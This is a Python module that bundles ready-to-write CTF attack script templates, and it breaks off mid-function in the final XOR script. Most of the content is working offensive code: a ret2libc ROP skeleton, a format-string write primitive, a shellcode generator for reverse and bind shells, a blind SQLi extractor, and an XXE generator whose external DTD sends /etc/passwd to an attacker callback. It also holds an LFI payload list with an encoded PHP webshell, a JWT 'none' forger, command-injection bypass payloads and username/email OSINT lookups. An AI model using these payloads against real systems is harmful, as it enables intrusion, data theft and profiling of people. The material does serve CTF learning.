# -*- coding: utf-8 -*-
"""
Script Manager Module
Provides utility scripts for common CTF challenges.
Generates ready-to-use Python scripts in the local workspace.
"""

import logging
from pathlib import Path

logger = logging.getLogger(__name__)

# ─── Script Templates ─────────────────────────────────────────────────────────

SCRIPTS = {
    "Pwn": {
        "ret2libc": {
            "description": "Standard Return-to-libc (ROP) exploit skeleton using pwntools.",
            "content": '''#!/usr/bin/env python3
"""
ret2libc Exploit Skeleton
Usage: python ret2libc.py [--remote] [--debug]
"""
from pwn import *
import argparse
import os

# Parse arguments
parser = argparse.ArgumentParser(description='ret2libc exploit')
parser.add_argument('--remote', action='store_true', help='Connect to remote target')
parser.add_argument('--debug', action='store_true', help='Run with GDB')
args = parser.parse_args()

# Set up the binary
exe = context.binary = ELF('./target_binary', checksec=False)
libc = ELF('./libc.so.6', checksec=False) if os.path.exists('./libc.so.6') else None

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.remote:
        return remote('target_host', 1337)
    else:
        if args.debug:
            return gdb.debug([exe.path] + argv, gdbscript="""
                b *main
                continue
            """, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)

def exploit():
    io = start()
    
    # 1. Find offset (cyclic 100)
    offset = 40  # Update with your offset!
    
    # 2. Information Leak (e.g., puts(puts@got))
    rop = ROP(exe)
    rop.puts(exe.got['puts'])
    rop.main() # Return to main after leak
    
    log.info(f"Leak ROP chain:\\n{rop.dump()}")
    
    payload1 = flat({ offset: rop.chain() })
    
    # Send payload and parse leak
    # io.recvuntil(b'Buffer:')
    io.sendline(payload1)
    
    # leaked_puts = u64(io.recvline().strip().ljust(8, b'\\x00'))
    # log.success(f"Leaked puts: {hex(leaked_puts)}")
    
    # 3. Calculate libc base
    # libc.address = leaked_puts - libc.sym['puts']
    # log.success(f"Libc base: {hex(libc.address)}")
    
    # 4. Final Payload (system('/bin/sh'))
    # rop2 = ROP(libc)
    # rop2.system(next(libc.search(b'/bin/sh\\x00')))
    
    # payload2 = flat({ offset: rop2.chain() })
    # io.sendline(payload2)
    
    io.interactive()

if __name__ == '__main__':
    exploit()
'''
        },
        "format_string": {
            "description": "Format string exploitation template with leak and write primitives.",
            "content": '''#!/usr/bin/env python3
"""
Format String Exploit Template
Demonstrates leak and arbitrary write techniques using format strings.
"""

from pwn import *

exe = context.binary = ELF('./target_binary', checksec=False)

def start():
    if args.REMOTE:
        return remote('target_host', 1337)
    else:
        return process(exe.path)

def leak_stack(io, offset):
    """Leak a value at a specific offset on the stack."""
    payload = f"%{offset}$p".encode()
    io.sendline(payload)
    result = io.recvline()
    leaked = int(result.strip(), 16)
    return leaked

def write_arbitrary(io, where, what, offset):
    """
    Write arbitrary value to arbitrary address using format string.
    offset: position on stack where our buffer starts
    """
    # Using %n to write the value byte by byte
    payload = p64(where)
    payload += f"%{what}c%{offset}$n".encode()
    io.sendline(payload)

def exploit():
    io = start()
    
    # Example: Leak a stack address to defeat ASLR
    # leaked_addr = leak_stack(io, 6)
    # log.success(f"Leaked address: {hex(leaked_addr)}")
    
    # Example: Overwrite GOT entry
    # write_arbitrary(io, exe.got['exit'], 0x4141414141, 6)
    
    io.interactive()

if __name__ == '__main__':
    exploit()
'''
        },
        "shellcode_gen": {
            "description": "Shellcode generator with common payloads (execve, reverse shell, bindshell).",
            "content": '''#!/usr/bin/env python3
"""
Shellcode Generator
Generates common shellcode payloads for various architectures.
"""
from pwn import *
import argparse

def generate_shellcode(arch_str, payload_type):
    """Generate shellcode based on architecture and payload type."""
    context.clear()
    context.arch = arch_str
    
    if payload_type == 'execve':
        if arch_str == 'amd64':
            shellcode = asm(shellcraft.sh())
        elif arch_str == 'i386':
            shellcode = asm(shellcraft.i386.linux.sh())
        elif arch_str == 'arm':
            shellcode = asm(shellcraft.arm.linux.sh())
        else:
            log.error(f"Unsupported architecture: {arch_str}")
            return None
    
    elif payload_type == 'reverse_shell':
        ip = input("[?] Enter LHOST: ")
        port = int(input("[?] Enter LPORT: "))
        if arch_str == 'amd64':
            shellcode = asm(shellcraft.connect(ip, port) + shellcraft.dupsh())
        elif arch_str == 'i386':
            shellcode = asm(shellcraft.i386.linux.connect(ip, port) + shellcraft.i386.linux.dupsh())
        else:
            log.error(f"Unsupported architecture for reverse shell: {arch_str}")
            return None
    
    elif payload_type == 'bindshell':
        port = int(input("[?] Enter bind port: "))
        if arch_str == 'amd64':
            shellcode = asm(shellcraft.bindsh(port))
        elif arch_str == 'i386':
            shellcode = asm(shellcraft.i386.linux.bindsh(port))
        else:
            log.error(f"Unsupported architecture for bindshell: {arch_str}")
            return None
    
    return shellcode

def main():
    parser = argparse.ArgumentParser(description="Shellcode Generator")
    parser.add_argument('-a', '--arch', choices=['amd64', 'i386', 'arm'], default='amd64')
    parser.add_argument('-t', '--type', choices=['execve', 'reverse_shell', 'bindshell'], default='execve')
    args = parser.parse_args()
    
    shellcode = generate_shellcode(args.arch, args.type)
    
    if shellcode:
        log.success(f"Generated {args.type} shellcode for {args.arch}:")
        log.info(f"Length: {len(shellcode)} bytes")
        print("\\n[Shellcode Hex]:")
        print(shellcode.hex())
        print("\\n[Shellcode Bytes]:")
        print(shellcode)
        print("\\n[Python format]:")
        print(repr(shellcode))

if __name__ == '__main__':
    main()
'''
        }
    },
    "Forensics": {
        "pcap_http_extract": {
            "description": "Extract HTTP GET/POST requests and DNS queries from a .pcap file using scapy.",
            "content": '''#!/usr/bin/env python3
"""
PCAP HTTP & DNS Extractor
Analyzes a PCAP file to extract HTTP requests and DNS queries.
Requires: pip install scapy
"""
import argparse
from scapy.all import rdpcap
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS, DNSQR

def analyze_pcap(pcap_file: str):
    print(f"[*] Loading {pcap_file}...")
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Failed to load PCAP: {e}")
        return

    print("\\n[*] --- HTTP Requests ---")
    http_count = 0
    for pkt in packets:
        if pkt.haslayer(HTTPRequest):
            http_count += 1
            http_layer = pkt.getlayer(HTTPRequest)
            method = http_layer.Method.decode() if http_layer.Method else "N/A"
            host = http_layer.Host.decode() if http_layer.Host else "N/A"
            path = http_layer.Path.decode() if http_layer.Path else "N/A"
            
            print(f"[+] HTTP {method} -> {host}{path}")
            
            # Print POST payload if exists
            if method == "POST" and pkt.haslayer("Raw"):
                payload = pkt.getlayer("Raw").load
                print(f"    Payload: {payload}")
                
    if http_count == 0:
        print("[-] No HTTP requests found.")

    print("\\n[*] --- DNS Queries ---")
    dns_count = 0
    for pkt in packets:
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            dns_count += 1
            query = pkt[DNSQR].qname.decode('utf-8', errors='ignore')
            print(f"[+] DNS Query: {query}")
            
    if dns_count == 0:
        print("[-] No DNS queries found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Extract HTTP and DNS traffic from a PCAP.")
    parser.add_argument("pcap_file", help="Path to the .pcap file")
    args = parser.parse_args()
    
    analyze_pcap(args.pcap_file)
'''
        },
        "strings_extractor": {
            "description": "Extract interesting strings from binary files with pattern matching.",
            "content": '''#!/usr/bin/env python3
"""
Advanced Strings Extractor
Extract strings from binary files with filtering and pattern matching.
"""
import argparse
import re
import string

def extract_strings(file_path, min_length=4, patterns=None):
    """Extract printable strings from a binary file."""
    printable = set(string.printable.encode())
    
    with open(file_path, 'rb') as f:
        result = []
        current_string = b''
        
        while True:
            byte = f.read(1)
            if not byte:
                break
            
            if byte in printable:
                current_string += byte
            else:
                if len(current_string) >= min_length:
                    result.append(current_string)
                current_string = b''
        
        # Don't forget the last string
        if len(current_string) >= min_length:
            result.append(current_string)
    
    return result

def filter_patterns(strings_list, patterns):
    """Filter strings based on regex patterns."""
    filtered = []
    for s in strings_list:
        s_str = s.decode('latin-1', errors='ignore')
        for pattern in patterns:
            if re.search(pattern, s_str, re.IGNORECASE):
                filtered.append(s)
                break
    return filtered

def main():
    parser = argparse.ArgumentParser(description="Extract strings from binary files")
    parser.add_argument("file", help="File to analyze")
    parser.add_argument("-m", "--min-length", type=int, default=4, help="Minimum string length")
    parser.add_argument("-p", "--pattern", action='append', help="Regex patterns to filter (can be used multiple times)")
    parser.add_argument("-f", "--flag-only", action='store_true', help="Only show strings containing 'flag' pattern")
    args = parser.parse_args()
    
    print(f"[*] Extracting strings from: {args.file}")
    strings_list = extract_strings(args.file, args.min_length)
    print(f"[*] Found {len(strings_list)} strings")
    
    # Apply filters
    if args.flag_only:
        patterns = [r'flag', r'ctf', r'HTB', r'thm']
        strings_list = filter_patterns(strings_list, patterns)
        print(f"[*] Filtered to {len(strings_list)} flag-related strings")
    elif args.pattern:
        strings_list = filter_patterns(strings_list, args.pattern)
        print(f"[*] Filtered to {len(strings_list)} matching strings")
    
    # Display results
    print("\\n" + "="*60)
    for s in strings_list:
        try:
            print(s.decode('utf-8'))
        except:
            print(s.decode('latin-1', errors='ignore'))

if __name__ == '__main__':
    main()
'''
        },
        "memory_dump_analyzer": {
            "description": "Basic memory dump analyzer to extract strings and patterns.",
            "content": '''#!/usr/bin/env python3
"""
Memory Dump Analyzer
Searches memory dumps for interesting patterns like URLs, IPs, emails, keys.
"""
import argparse
import re

PATTERNS = {
    'ipv4': rb'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b',
    'url': rb'https?://[^\\s<>"]+',
    'email': rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}',
    'flag': rb'flag\\{[^}]+\\}|[A-Z]{3}\\{[^}]+\\}',
    'base64': rb'[A-Za-z0-9+/]{20,}={0,2}',
    'hex_key': rb'[0-9a-fA-F]{32,}',
}

def search_patterns(file_path):
    """Search for various patterns in a memory dump."""
    print(f"[*] Analyzing memory dump: {file_path}")
    
    with open(file_path, 'rb') as f:
        data = f.read()
    
    results = {}
    for name, pattern in PATTERNS.items():
        matches = list(set(re.findall(pattern, data)))
        if matches:
            results[name] = matches
            print(f"\\n[+] Found {len(matches)} {name.upper()} patterns:")
            for match in matches[:20]:  # Limit to first 20
                try:
                    print(f"    {match.decode('utf-8', errors='ignore')}")
                except:
                    print(f"    {match}")
            if len(matches) > 20:
                print(f"    ... and {len(matches) - 20} more")
    
    return results

def main():
    parser = argparse.ArgumentParser(description="Memory Dump Pattern Analyzer")
    parser.add_argument("dump_file", help="Path to memory dump file")
    args = parser.parse_args()
    
    search_patterns(args.dump_file)
    print("\\n[*] Analysis complete!")

if __name__ == '__main__':
    main()
'''
        }
    },
    "OSINT": {
        "username_osint": {
            "description": "Fast username enumeration and recon across popular platforms using requests.",
            "content": '''#!/usr/bin/env python3
"""
Username Recon & OSINT Tool
Quickly checks if a username exists across various platforms.
"""
import requests
import argparse
import concurrent.futures

PLATFORMS = {
    "GitHub": "https://github.com/{}",
    "Twitter": "https://twitter.com/{}",
    "Instagram": "https://www.instagram.com/{}/",
    "Reddit": "https://www.reddit.com/user/{}",
    "GitLab": "https://gitlab.com/{}",
    "HackTheBox": "https://app.hackthebox.com/users/{}",
    "TryHackMe": "https://tryhackme.com/p/{}",
    "Medium": "https://medium.com/@{}",
    "LinkedIn": "https://www.linkedin.com/in/{}",
    "Facebook": "https://www.facebook.com/{}",
}

def check_platform(name: str, url_template: str, username: str):
    url = url_template.format(username)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            print(f"[+] FOUND on {name}: {url}")
        elif r.status_code == 404:
            pass # Not found
        else:
            print(f"[*] Possible on {name} (HTTP {r.status_code}): {url}")
    except requests.exceptions.RequestException:
        print(f"[-] Error checking {name}")

def enumerate_user(username: str):
    print(f"[*] Starting OSINT for user: {username}\\n")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for platform_name, url_template in PLATFORMS.items():
            futures.append(executor.submit(check_platform, platform_name, url_template, username))
            
        concurrent.futures.wait(futures)
        
    print("\\n[*] Recon complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enumerate a username across platforms.")
    parser.add_argument("username", help="The username to search for")
    args = parser.parse_args()
    
    enumerate_user(args.username)
'''
        },
        "email_osint": {
            "description": "Email OSINT tool to gather information about an email address.",
            "content": '''#!/usr/bin/env python3
"""
Email OSINT Tool
Gathers information about an email address from various sources.
"""
import requests
import argparse
import json

def check_haveibeenpwned(email):
    """Check if email appears in known data breaches."""
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {'User-Agent': 'OSINT-Tool'}
    
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            breaches = r.json()
            print(f"\\n[!] Email found in {len(breaches)} data breaches:")
            for breach in breaches[:5]:  # Show first 5
                print(f"    - {breach['Name']}: {breach['BreachDate']}")
            if len(breaches) > 5:
                print(f"    ... and {len(breaches) - 5} more")
        elif r.status_code == 404:
            print("\\n[+] Email not found in known breaches (good news!)")
        else:
            print(f"\\n[-] HIBP returned status: {r.status_code}")
    except Exception as e:
        print(f"[-] Error checking HIBP: {e}")

def check_hunter_io(email, api_key=None):
    """Check Hunter.io for email verification (requires API key)."""
    if not api_key:
        print("\\n[*] Skipping Hunter.io (no API key provided)")
        return
    
    url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={api_key}"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()['data']
            print(f"\\n[*] Hunter.io results:")
            print(f"    Status: {data.get('status', 'Unknown')}")
            print(f"    Score: {data.get('score', 'N/A')}")
    except Exception as e:
        print(f"[-] Error checking Hunter.io: {e}")

def extract_domain_info(email):
    """Extract and display domain information."""
    domain = email.split('@')[1] if '@' in email else None
    if domain:
        print(f"\\n[*] Domain: {domain}")
        print(f"    https://whois.domaintools.com/{domain}")
        print(f"    https://www.virustotal.com/gui/domain/{domain}")

def main():
    parser = argparse.ArgumentParser(description="Email OSINT Tool")
    parser.add_argument("email", help="Email address to investigate")
    parser.add_argument("--hunter-key", help="Hunter.io API key (optional)")
    args = parser.parse_args()
    
    print(f"[*] Starting OSINT for: {args.email}")
    
    extract_domain_info(args.email)
    check_haveibeenpwned(args.email)
    check_hunter_io(args.email, args.hunter_key)
    
    print("\\n[*] OSINT complete!")

if __name__ == '__main__':
    main()
'''
        }
    },
    "Web": {
        "blind_sqli": {
            "description": "Template for Time-based or Boolean Blind SQLi via binary search.",
            "content": '''#!/usr/bin/env python3
"""
Blind SQL Injection Extractor
Template for Boolean or Time-based Blind SQLi using binary search.
Modify the `check_condition` function for your specific target.
Usage: python blind_sqli.py
"""
import requests
import string
import time

TARGET_URL = "http://example.com/vuln"
KNOWN_PREFIX = "flag{"

# Character set to test (printable ASCII)
CHARSET = string.printable

def check_condition(query: str) -> bool:
    """
    Returns True if the injected condition is true.
    Modify this based on Boolean (error/content) or Time-based responses.
    """
    payload = f"test' AND ({query}) AND '1'='1"
    
    # --- Boolean Based Example ---
    # r = requests.get(TARGET_URL, params={"id": payload})
    # return "Welcome back" in r.text
    
    # --- Time Based Example ---
    # start_time = time.time()
    # r = requests.get(TARGET_URL, params={"id": payload})
    # return (time.time() - start_time) > 2
    
    # Placeholder return
    return False

def binary_search_char(query_template: str, index: int) -> str:
    """Find a single character using binary search."""
    low, high = 32, 126  # ASCII printable range
    
    while low <= high:
        mid = (low + high) // 2
        # Check if ascii value is greater than mid
        if check_condition(query_template.format(index, mid)):
            low = mid + 1
        else:
            high = mid - 1
            
    # Verification
    if check_condition(f"ascii(substring((select flag from flag limit 1),{index},1))={low}"):
         return chr(low)
    return None

def extract_data():
    print("[*] Starting extraction...")
    result = KNOWN_PREFIX
    index = len(result) + 1
    
    # Example Query Template: "ascii(substring((select flag from flag limit 1),{0},1))>{1}"
    query_template = "ascii(substring((select flag from flag limit 1),{0},1))>{1}"
    
    while True:
        c = binary_search_char(query_template, index)
        if c:
            result += c
            print(f"\\r[+] Extracted so far: {result}", end="", flush=True)
            index += 1
            if c == '}': # Stop condition
                break
        else:
            break
            
    print(f"\\n[+] Final Result: {result}")

if __name__ == "__main__":
    extract_data()
'''
        },
        "xxe_exploit": {
            "description": "XXE (XML External Entity) exploitation payloads generator.",
            "content": '''#!/usr/bin/env python3
"""
XXE (XML External Entity) Payload Generator
Generates various XXE payloads for file disclosure and SSRF.
"""
import argparse

def generate_file_read(file_path):
    """Generate XXE payload to read a local file."""
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}"> ]>
<root>
    <data>&xxe;</data>
</root>"""
    return payload

def generate_ssrf(url):
    """Generate XXE payload for SSRF."""
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}"> ]>
<root>
    <data>&xxe;</data>
</root>"""
    return payload

def generate_blind_xxe(callback_url):
    """Generate Blind XXE payload with external DTD."""
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<root>
    <data>&exfil;</data>
</root>"""
    
    dtd = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfil;"""
    
    return payload, dtd

def main():
    parser = argparse.ArgumentParser(description="XXE Payload Generator")
    parser.add_argument("-t", "--type", choices=["file", "ssrf", "blind"], required=True, help="Type of XXE payload")
    parser.add_argument("--target", help="File path or URL target")
    parser.add_argument("--callback", help="Callback URL for blind XXE")
    args = parser.parse_args()
    
    if args.type == "file":
        if not args.target:
            print("[-] --target required for file read (e.g., /etc/passwd)")
            return
        print("[+] File Read XXE Payload:")
        print(generate_file_read(args.target))
    
    elif args.type == "ssrf":
        if not args.target:
            print("[-] --target required for SSRF (e.g., http://internal-service)")
            return
        print("[+] SSRF XXE Payload:")
        print(generate_ssrf(args.target))
    
    elif args.type == "blind":
        if not args.callback:
            print("[-] --callback required for blind XXE (e.g., http://attacker.com)")
            return
        print("[+] Blind XXE Payload:")
        payload, dtd = generate_blind_xxe(args.callback)
        print(payload)
        print("\\n[+] evil.dtd content (host this on your server):")
        print(dtd)

if __name__ == '__main__':
    main()
'''
        },
        "lfi_fuzzer": {
            "description": "LFI/RFI path traversal fuzzer with common payloads.",
            "content": '''#!/usr/bin/env python3
"""
LFI/RFI Fuzzer
Tests for Local/Remote File Inclusion vulnerabilities.
"""
import requests
import argparse
from urllib.parse import urljoin

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
]

def test_lfi(url, param, payloads):
    """Test LFI vulnerability with various payloads."""
    results = []
    
    print(f"[*] Testing {len(payloads)} payloads against {param} parameter...")
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        
        try:
            r = requests.get(test_url, timeout=5)
            
            # Check for common indicators
            if any(indicator in r.text.lower() for indicator in ['root:x:', 'root:0:', 'windows', '[boot loader]']):
                print(f"[+] POSSIBLE LFI: {payload}")
                print(f"    URL: {test_url}")
                print(f"    Response length: {len(r.text)}")
                results.append((payload, test_url))
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {payload}: {e}")
    
    return results

def main():
    parser = argparse.ArgumentParser(description="LFI/RFI Fuzzer")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/page.php)")
    parser.add_argument("-p", "--param", default="file", help="Parameter name to test (default: file)")
    parser.add_argument("--custom-payload", help="Test a single custom payload")
    args = parser.parse_args()
    
    if args.custom_payload:
        payloads = [args.custom_payload]
    else:
        payloads = LFI_PAYLOADS
    
    results = test_lfi(args.url, args.param, payloads)
    
    print(f"\\n[*] Testing complete. Found {len(results)} potential vulnerabilities.")

if __name__ == '__main__':
    main()
'''
        },
        "jwt_forge": {
            "description": "JWT decoder and forger (supports 'none' alg or known secret).",
            "content": '''#!/usr/bin/env python3
"""
JWT Forger Tool
Decodes JWT tokens, modifies payload, and re-signs them.
Requires: pip install pyjwt
Usage: python jwt_forge.py <token> [--secret <secret>] [--alg <alg>] [--payload '<json>']
"""
import argparse
import json
import sys
try:
    import jwt
except ImportError:
    print("[-] Error: 'pyjwt' not installed. Run: pip install pyjwt")
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="JWT Forger")
    parser.add_argument("token", help="The original JWT token")
    parser.add_argument("--secret", default="", help="Secret key to sign the forged token")
    parser.add_argument("--alg", default="none", help="Algorithm to use (e.g., none, HS256)")
    parser.add_argument("--payload", help="JSON string of the modified payload")
    
    args = parser.parse_args()
    
    print("[*] Original Token Decoding...")
    try:
        # Decode header and payload without verification
        header = jwt.get_unverified_header(args.token)
        payload = jwt.decode(args.token, options={"verify_signature": False})
        
        print(f"\\n[Header]:\\n{json.dumps(header, indent=2)}")
        print(f"\\n[Payload]:\\n{json.dumps(payload, indent=2)}\\n")
        
    except Exception as e:
        print(f"[-] Failed to decode token: {e}")
        return

    # If payload is provided, we forge
    if args.payload:
        try:
            new_payload = json.loads(args.payload)
            print("[*] Forging new token...")
            
            if args.alg.lower() == "none":
                # Some servers accept 'none' algorithm bypass
                # Note: pyjwt >= 2.0 requires special handling for 'none'
                encoded = jwt.encode(new_payload, "", algorithm="none")
            else:
                encoded = jwt.encode(new_payload, args.secret, algorithm=args.alg)
                
            print(f"\\n[+] Forged Token:\\n{encoded}")
            
        except json.JSONDecodeError:
            print("[-] Error: Invalid JSON in --payload")
        except Exception as e:
            print(f"[-] Failed to forge token: {e}")

if __name__ == "__main__":
    main()
'''
        },
        "command_injection": {
            "description": "Command injection payload generator and fuzzer.",
            "content": '''#!/usr/bin/env python3
"""
Command Injection Fuzzer
Tests for command injection vulnerabilities with various bypass techniques.
"""
import requests
import argparse
import time

PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)",
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "%0a whoami",
    "\\n whoami",
    "{whoami,}",
    # Bypass filters
    "who'am'i",
    "who''ami",
    "who\\ami",
    "w'h'o'a'm'i",
]

def test_command_injection(url, param, cmd="whoami"):
    """Test for command injection vulnerabilities."""
    print(f"[*] Testing command injection on parameter: {param}")
    print(f"[*] Target command: {cmd}\\n")
    
    # Generate custom payloads with specified command
    custom_payloads = [p.replace("whoami", cmd) for p in PAYLOADS]
    
    results = []
    for payload in custom_payloads:
        test_url = f"{url}?{param}={payload}"
        
        try:
            start_time = time.time()
            r = requests.get(test_url, timeout=10)
            elapsed = time.time() - start_time
            
            # Time-based detection (for sleep)
            if "sleep" in payload and elapsed > 4:
                print(f"[+] TIME-BASED INJECTION DETECTED!")
                print(f"    Payload: {payload}")
                print(f"    Time: {elapsed:.2f}s")
                results.append(payload)
            
            # Content-based detection
            elif cmd in r.text.lower() or "root" in r.text.lower():
                print(f"[+] POSSIBLE INJECTION DETECTED!")
                print(f"    Payload: {payload}")
                print(f"    Response preview: {r.text[:200]}")
                results.append(payload)
                
        except requests.exceptions.Timeout:
            if "sleep" in payload:
                print(f"[+] TIMEOUT (possible time-based injection): {payload}")
                results.append(payload)
        except Exception as e:
            pass
    
    return results

def main():
    parser = argparse.ArgumentParser(description="Command Injection Fuzzer")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--param", default="cmd", help="Parameter name to test")
    parser.add_argument("-c", "--command", default="whoami", help="Command to execute")
    args = parser.parse_args()
    
    results = test_command_injection(args.url, args.param, args.command)
    
    print(f"\\n[*] Testing complete. Found {len(results)} potential vulnerabilities.")

if __name__ == '__main__':
    main()
'''
        }
    },
    "Crypto": {
        "rsa_basic": {
            "description": "Basic RSA solver using factordb to factorize N.",
            "content": '''#!/usr/bin/env python3
"""
Basic RSA Solver
Attempts to solve RSA challenges by querying FactorDB for factors of N.
Requires `pip install pycryptodome requests`.
Usage: python rsa_basic.py -n <N> -e <E> -c <C>
"""
import argparse
import requests
from Crypto.Util.number import inverse, long_to_bytes

def get_factors(n):
    """Query FactorDB for factors of N."""
    try:
        r = requests.get(f"http://factordb.com/api?query={n}")
        data = r.json()
        if data['status'] == 'FF':
            factors = []
            for f, count in data['factors']:
                factors.extend([int(f)] * count)
            return factors
    except Exception as e:
        print(f"[-] FactorDB query failed: {e}")
    return None

def main():
    parser = argparse.ArgumentParser(description="Basic RSA Solver using FactorDB")
    parser.add_argument("-n", type=int, required=True, help="Modulus N")
    parser.add_argument("-e", type=int, required=True, help="Public Exponent E")
    parser.add_argument("-c", type=int, required=True, help="Ciphertext C")
    args = parser.parse_args()

    n, e, c = args.n, args.e, args.c

    print(f"[*] Querying FactorDB for N={n}...")
    factors = get_factors(n)

    if not factors or len(factors) < 2:
        print("[-] Could not find factors on FactorDB.")
        return

    p = factors[0]
    q = factors[1]
    print(f"[+] Found factors:\\n  p = {p}\\n  q = {q}")

    phi = (p - 1) * (q - 1)
    
    try:
        d = inverse(e, phi)
        print(f"[+] Calculated Private Exponent D = {d}")
        
        m = pow(c, d, n)
        pt = long_to_bytes(m)
        print(f"[+] Decrypted Message: {pt}")
        try:
            print(f"[+] Decoded String: {pt.decode()}")
        except:
            pass
    except Exception as err:
         print(f"[-] Error calculating D or decrypting: {err}")

if __name__ == "__main__":
    main()
'''
        },
        "rsa_wiener": {
            "description": "Wiener's attack on RSA with small private exponent.",
            "content": '''#!/usr/bin/env python3
"""
Wiener's Attack on RSA
Exploits RSA when d < N^0.25 (private exponent is too small).
Requires: pip install pycryptodome
"""
import argparse
from Crypto.Util.number import long_to_bytes
from fractions import Fraction

def wiener_attack(e, n):
    """Perform Wiener's attack to recover d."""
    # Continued fraction expansion of e/n
    convergents = []
    cf = continued_fraction(Fraction(e, n))
    
    for i in range(len(cf)):
        convergent = convergent_from_cf(cf[:i+1])
        convergents.append(convergent)
    
    # Test each convergent
    for k, d in convergents:
        if k == 0:
            continue
        
        # Check if this d works: phi = (e*d - 1) / k
        if (e * d - 1) % k == 0:
            phi_candidate = (e * d - 1) // k
            
            # Solve for p and q from: x^2 - (n - phi + 1)x + n = 0
            b = n - phi_candidate + 1
            discriminant = b*b - 4*n
            
            if discriminant >= 0:
                sqrt_disc = isqrt(discriminant)
                if sqrt_disc * sqrt_disc == discriminant:
                    p = (b + sqrt_disc) // 2
                    q = (b - sqrt_disc) // 2
                    
                    if p * q == n:
                        return d
    
    return None

def continued_fraction(frac):
    """Compute continued fraction representation."""
    cf = []
    while frac.denominator != 0:
        cf.append(frac.numerator // frac.denominator)
        frac = Fraction(frac.denominator, frac.numerator % frac.denominator)
    return cf

def convergent_from_cf(cf):
    """Compute convergent (k, d) from continued fraction."""
    if len(cf) == 0:
        return (0, 1)
    
    num = cf[-1]
    den = 1
    
    for i in range(len(cf) - 2, -1, -1):
        num, den = den, num
        num += cf[i] * den
    
    return (den, num)

def isqrt(n):
    """Integer square root."""
    if n < 0:
        raise ValueError("Square root of negative number")
    if n == 0:
        return 0
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x

def main():
    parser = argparse.ArgumentParser(description="Wiener's Attack on RSA")
    parser.add_argument("-n", type=int, required=True, help="Modulus N")
    parser.add_argument("-e", type=int, required=True, help="Public Exponent E")
    parser.add_argument("-c", type=int, required=True, help="Ciphertext C")
    args = parser.parse_args()
    
    print("[*] Attempting Wiener's attack...")
    d = wiener_attack(args.e, args.n)
    
    if d:
        print(f"[+] Found private exponent: d = {d}")
        
        # Decrypt the message
        m = pow(args.c, d, args.n)
        plaintext = long_to_bytes(m)
        
        print(f"[+] Decrypted message: {plaintext}")
        try:
            print(f"[+] Decoded string: {plaintext.decode()}")
        except:
            pass
    else:
        print("[-] Wiener's attack failed. The private exponent may not be small enough.")

if __name__ == '__main__':
    main()
'''
        },
        "xor_bruteforce": {
            "description": "Single-byte XOR bruteforce to find 'flag{' patterns.",
            "content": '''#!/usr/bin/env python3
"""
Single-byte XOR Bruteforce
Attempts to XOR a given ciphertext with all 256 possible bytes
and filters for a known plaintext pattern (e.g., 'flag{').
Usage: python xor_bruteforce.py <hex_or_b64_string>
"""
import argparse
import base64
import binascii

def single_byte_xor(ciphertext_bytes, key_byte):
    """XOR every byte of ciphertext with key_byte."""
    return bytes([b ^ key_byte for b in ciphertext_bytes])

def score_text(text_bytes):
    """Calculate a score based on printable ASCII characters."""
    score = 0
    for b in text_bytes:
        # Printable ASCII range
        if 32 <= b <= 126 or b in (9, 10, 13):
            score += 1
    return score

def main():
    parser = argparse.ArgumentParser(description="Single-byte XOR Bruteforce")
    parser.add_argument("ciphertext", help="Ciphertext in Hex or Base64 format")
    parser.add_argument("--pattern", default="flag{", help="Known plaintext pattern to search for (default: flag{)")
    parser.add_argument("--format", choices=["hex", "b64", "auto"], default="auto", help="Input format")
    args = parser.parse_args()

    # Parse input
    ct_bytes = None
    if args.format in ("hex", "auto"):
        try:
            ct_bytes = bytes.fromhex(args.ciphertext)
        except ValueError:
            if args.format == "hex":
                print("[-] Invalid hex input.")
                return

    if not ct_bytes and args.format in ("b64", "auto"):
        try:
            ct_bytes = base64.b64decode(args.ciphertext)
        except binascii.Error:
             print("[-] Invalid Base64 input.")
             return
             
    if not ct_bytes:
